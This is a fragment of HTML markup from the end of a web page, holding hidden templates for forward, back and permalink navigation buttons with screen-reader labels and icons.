hidden> <button id="_forward" class="forward nav-btn no-hover fl"> <span class="sr-only">Forward</span> <span class="icon-arrow-right2"></span> </button> </template> <template id="_back-template" hidden> <button id="_back" class="back nav-btn no-hover fl"> <span class="sr-only">Back</span> <span class="icon-arrow-left2"></span> </button> </template> <template id="_permalink-template" hidden> <a href="#" class="permalink"> <span class="sr-only">Permalink</span> <span class="icon-link"></span> </a> </template></html>
